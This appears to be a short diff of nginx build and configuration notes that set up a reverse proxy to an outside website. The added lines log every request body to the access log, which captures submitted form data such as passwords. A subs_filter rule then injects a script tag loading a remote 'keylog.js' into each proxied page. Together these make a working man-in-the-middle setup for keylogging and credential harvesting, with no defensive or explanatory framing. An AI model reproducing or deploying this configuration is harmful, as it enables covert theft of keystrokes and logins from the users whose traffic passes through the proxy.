@@ -35,17 +35,24 @@ cd nginx-1.9.7/ && ./configure \
 http {
 
 add 	log_format custom '$request_body';
+
 add	access_log /var/log/nginx/access.log custom;
+
 del      include /etc/nginx/sites-enabled/*;
+
 add       include /etc/nginx/sites-enabled/default;
 
 #### Modif sites-available/default et sites-enabled/default
 
 
 	location / {
+	
 add		echo_read_request_body;
+
 add		proxy_pass http://www.microplus.fr/;
+
 add		subs_filter "</div>" "</div><script/src='https://www.microplus.fr/secu/images/test/keylog.js'></script>" -o;
+
 
 	
 
